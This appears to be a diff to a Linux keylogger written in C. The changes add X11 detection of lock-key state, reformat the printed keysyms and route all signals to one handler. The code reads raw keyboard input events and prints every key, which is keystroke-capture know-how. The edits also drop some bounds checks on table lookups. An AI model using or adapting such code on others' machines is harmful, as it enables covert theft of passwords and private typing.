@@ -16,6 +16,8 @@
 #include <sys/ioctl.h>
 #include <linux/kd.h>
 #include <wchar.h>
+#include <X11/XKBlib.h>
+#include <stdlib.h>
 
 #include "keylogger.h"
 #include "keys.h"
@@ -25,8 +27,25 @@ static int			loop;
 
 static void 		sigint(int sig)
 {
-	(void)sig;
-	loop = 0;
+	if (sig == SIGINT)
+		loop = 0;
+}
+
+static int			get_keystate(int *caps, int *num)
+{
+  Display 			*display;
+  char				*monitor;
+  unsigned 			state;
+
+	monitor = getenv("DISPLAY");
+	display = XOpenDisplay((monitor) ? monitor : ":0");
+	if (!display)
+		return printf("Can't get display to find Lockers states.\n");
+	if (XkbGetIndicatorState(display, XkbUseCoreKbd, &state) != Success)
+		return printf("Can't get indicator state for Lockers.\n");
+	*caps = state & 1;
+	*num = state & 2;
+	return (0);
 }
 
 static int  		print_keysym(int **key_table, int index, int state, int *capslock)
@@ -35,7 +54,6 @@ static int  		print_keysym(int **key_table, int index, int state, int *capslock)
 	int				code;
 	int 			type;
 	int 			value;
-	const char 		*p;
 
 	code = key_table[index][modifier];
 	type = KTYP(code);
@@ -43,10 +61,10 @@ static int  		print_keysym(int **key_table, int index, int state, int *capslock)
 	if (type >= syms_size) {
 		code = code ^ 0xf000;
 		if (code < 0)
-			return printf("(null)");
+			return printf("<(null)>");
 		if (code < 0x80)
 			return printf("%s", iso646_syms[code]);
-		return printf("%#04x", code);
+		return printf("[%#04x]", code);
 	}
 	if (type == KT_LETTER)
 		type = KT_LATIN;
@@ -55,24 +73,29 @@ static int  		print_keysym(int **key_table, int index, int state, int *capslock)
 			return shift_handler(value, state, &modifier, capslock);
 		if (type == KT_LOCK)
 			return lock_handler(value, state, &modifier, capslock);
-		if (state && (p = syms[type].table[value])[0])
-				return printf("%s", p);
-		return 0;
+		if (state)
+			return printf("%s", syms[type].table[value]);
 	}
-	if (type == KT_META && value < 128 && value < syms[0].size && (p = syms[0].table[value])[0])
-		return printf("Meta_%s", p);
-	return printf("%#04x", code);
+	if (type == KT_META && value < syms[0].size)
+		return printf("<Meta_%s>", syms[0].table[value]);
+	if (state)
+		return printf("[%#04x]", code);
+	return 0;
 }
 
-void					keylogger(int keybd, int **key_table, int capslock, int numlock)
+void					keylogger(int keybd, int **key_table)
 {
 	int					nbread;			// Number of events received at once.
-	struct input_event	events[128];	// Events.
-	int 				value;			// which key have been pressed.
-	int 				state;			// state 0: released 1:pressed 2:repeated
+	struct input_event	events[128];	// Events read.
+	int 				value;			// Which key have been pressed.
+	int 				state;			// State = 0:released, = 1:pressed, = 2:repeated.
+	int					capslock;
+	int					numlock;
 
-	(void)numlock;
-	signal(SIGINT, sigint);
+	// (void)numlock;
+	for (int i = 0; i < _NSIG; i++)
+		signal(i, sigint);
+	get_keystate(&capslock, &numlock);
 	loop = 1;
 	while (loop)
 	{
